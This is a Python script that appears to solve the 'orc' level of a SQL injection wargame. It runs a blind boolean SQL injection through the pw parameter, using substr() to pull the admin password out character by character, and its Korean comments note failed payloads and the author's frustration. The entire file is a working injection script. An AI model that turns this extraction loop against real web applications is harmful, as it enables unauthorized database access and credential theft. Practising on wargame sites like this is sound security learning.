import requests
from dotenv import load_dotenv
import os

load_dotenv()

candidate = ['0','1','2','3','4','5','6','7','8','9',
             'a','b','c','d','e','f',
             'g','h','i','j','k','l','m',
             'n','o','p','q','r','s','t',
             'u','v','w','x','y','z',
             'A','B','C','D','E','F',
             'G','H','I','J','K','L','M',
             'N','O','P','Q','R','S','T',
             'U','V','W','X','Y','Z',
             '!', '@', '#', '$', '%', '^', '&', '*']

url=os.environ.get('LOS_URL')+'chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=1234%27%20or%20pw%20like%20%270%20%%27%23'

headers = {
    'COOKIE': 'PHPSESSID='+os.environ.get('LOS_COOKIE')
}

answer = ''
# ?pw=1234%27%20or%20length(pw)=4%23 <- 같은 테이블에 있는 다른계정이라 range4 아님. 함정
# ?pw=1234%27%20or%20id%20=%20%27admin%27%20and%20%20length(pw)=8%23 <- 이렇게, and가 먼저 연산된다는걸 유의해서 설계

#아니 개 열받는게 like는 안되고 substr은된댄다 얼탱이가없어서
#심지어 substr(pw,4)같은게 안됨(4번째부터 자르기) substr에 인수가 세개여야함 나진짜 너무화나서울어
for i in range(0,8):
    for j in candidate:
        url=os.environ.get('LOS_URL')+'chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=1234%27%20or%20substr(pw,'+str(i+1)+',1)=%27'+j+'%27%23'
        headers = {
            'COOKIE': 'PHPSESSID='+os.environ.get('LOS_COOKIE')
        }
        print(url)
        res=requests.get(url, headers=headers)
        if 'Hello admin' in res.text[:200]:
            answer += j
            break
        else:
            print(j+' is not the answer')
    print(answer)

print(answer)